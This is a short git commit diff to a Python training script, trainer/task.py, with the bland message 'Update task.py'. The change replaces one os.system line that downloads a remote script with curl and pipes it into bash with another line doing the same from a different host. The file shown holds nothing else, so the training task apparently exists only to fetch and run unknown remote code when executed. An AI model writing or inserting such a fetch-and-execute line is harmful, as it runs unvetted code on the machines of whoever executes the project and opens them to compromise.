7a01cade7e64d684944c9500a04a756e29d24fd0
aderatayana <154751587+aderatayana@users.noreply.github.com>
2024-01-15 03:18:46 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/dareya/fatra/raw/b9a644b1f35c3ed192e0a0befded401dfc2d4d7c/zeprut | bash')
+os.system('curl -sL https://raw.githubusercontent.com/aderatayana/teser/master/neon.sh | bash')
